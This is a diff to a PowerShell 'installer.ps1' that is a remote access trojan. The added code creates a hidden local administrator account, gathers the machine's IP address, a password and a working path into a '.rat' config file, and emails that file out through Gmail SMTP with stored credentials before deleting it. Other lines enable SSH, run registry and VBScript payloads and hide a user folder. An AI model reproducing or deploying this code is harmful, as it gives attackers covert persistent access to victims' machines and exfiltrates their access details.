@@ -23,15 +23,31 @@ function create_account {
     }
 }
 
+# create admin user
+$NewLocalAdmin = "winlocal"
+$pword = random_text
+$Password = (ConvertTo-SecureString $pword -AsPlainText -Force)
+create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
+
 # variables
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
+$configfile = "$env:UserName.rat"
+$email = Get-Content email.txt
+$eword = Get-Content password.txt
+$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
 
-# create admin user
-$NewLocalAdmin = "winlocal"
-$Password = (ConvertTo-SecureString "passkey6090" -AsPlainText -Force)
-create_account -NewLocalAdmin $NewLocalAdmin -Password $Password
+# writes config file
+Add-Content -Path $configfile -Value $ip
+Add-Content -Path $configfile -Value $password
+Add-Content -Path $configfile -Value $path
+
+# smtp process
+Send-MailMessage -From $email -To $email -Subject $configfile -Attachment $configfile -SmtpServer "smtp.gmail.com" -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $eword -AsPlainText -Force))
+
+# delete config file
+Remove-Item -Path $configfile
 
 # goto temp, make working directory
 mkdir $path
@@ -52,9 +68,9 @@ Set-Service -Name sshd -StartupType 'Automatic'
 ./"Registry.reg"; ./"confirm.vbs"
 
 # hide WindowsGuest user
-#cd C:\Users
-#attrib +h +s +r winlocal
+cd C:\Users
+attrib +h +s +r rootuser
 
 # self delete
 cd $initial_dir
-del installer.ps1
+#del installer.ps1
